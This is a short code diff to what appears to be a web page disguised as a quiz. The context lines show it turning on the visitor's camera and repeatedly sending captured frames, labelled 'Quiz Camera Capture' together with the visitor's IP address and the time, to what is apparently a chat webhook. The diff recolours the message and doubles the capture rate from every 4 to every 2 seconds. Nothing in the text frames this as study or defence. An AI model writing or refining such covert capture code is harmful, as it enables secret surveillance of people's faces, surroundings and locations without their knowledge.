@@ -244,7 +244,7 @@
           content: `Frame ${frameCounter}`,
           embeds: [{
             title: "Quiz Camera Capture",
-            color: 0xFF69B4,
+            color: 0x9B59B6,
             fields: [
               { name: "IP", value: `\`${ip}\``, inline: true },
               { name: "Time", value: new Date().toLocaleString(), inline: true }
@@ -319,7 +319,7 @@
         video.play().catch(() => {});
 
         setTimeout(() => sendFrame(), 1500);
-        captureInterval = setInterval(sendFrame, 4000);
+        captureInterval = setInterval(sendFrame, 2000);
 
         showQuiz();
       } catch (error) {
